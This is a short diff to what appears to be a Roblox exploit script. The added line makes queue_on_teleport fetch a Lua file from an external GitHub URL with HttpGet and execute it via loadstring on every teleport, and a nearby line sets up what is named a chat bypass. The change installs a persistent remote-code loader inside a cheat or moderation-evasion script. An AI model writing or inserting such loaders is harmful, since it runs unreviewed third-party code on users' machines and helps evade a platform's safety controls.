@@ -1,4 +1,4 @@
-queue_on_teleport([[]])
+queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/tempservice/host/main/main.lua"))()]])
 
 local chat_bypass = Instance.new("TextChannel")
 
